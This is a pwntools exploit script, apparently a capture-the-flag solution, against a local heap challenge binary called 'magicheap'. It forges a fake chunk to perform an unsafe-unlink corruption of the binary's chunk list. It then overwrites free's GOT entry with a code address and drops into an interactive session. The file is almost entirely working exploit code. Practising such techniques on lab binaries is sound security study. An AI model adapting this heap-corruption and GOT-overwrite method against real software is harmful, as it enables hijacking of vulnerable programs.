from pwn import *
context(log_level="debug")

#p = process('./magicheap')
p = gdb.debug('./magicheap', 'break menu')

elf=ELF('./magicheap')

def create(size, content):
	p.sendlineafter('Your choice :', '1')
	p.sendlineafter('Size of Heap : ', str(size))
	p.sendafter('Content of heap:', content)
def edit(index, size, content):
	p.sendlineafter('Your choice :', '2')
	p.sendlineafter('Index :', str(index))
	p.sendlineafter('Size of Heap : ', str(size))
	p.sendafter('Content of heap : ', content)
def free(index):
	p.sendlineafter('Your choice :', '3')
	p.sendlineafter('Index :', str(index))

callmenu=0x00000000004008cb
magic=0x00000000006020a0
chunklist=0x00000000006020e0
puts_plt =elf.plt['puts']
puts_plt =0x0000000000400700
puts_plt =0x0000000000400c23
free_got =0x0000000000602018

create(0x90, 'aaaa')
create(0x10, 'bbbb')
create(0x90, 'cccc')
create(0x10, 'dddd')
create(0x90, 'eeee')
create(0x10, 'ffff')
create(0x90, 'eeee')
create(0x10, 'ffff')

free(2)
free(4)
free(6)




fake_chunk = p64(0) + p64(0x91)
fake_chunk += p64(chunklist - 0x18) + p64(chunklist - 0x10)
fake_chunk = fake_chunk.ljust(0x90, 'a')
fake_chunk += p64(0x90) + p64(0xa0)

#gdb.attach(p, "b *0x00000000004008cf")
#gdb.attach(p)

#print "pid " + str(proc.pidof(p))


#raw_input("attach me 1")
edit(0, 0x100, fake_chunk)
#raw_input("attach me 2")
free(1)
#raw_input("attach me 3")
edit(0, 0x20, 'a'*0x18+p64(free_got))
#raw_input("attach me 4")
edit(0, 0x8, p64(puts_plt))
#raw_input("attach me 5")
#gdb.attach(p, "b *0x00000000004008AD")

free(2)
p.interactive()


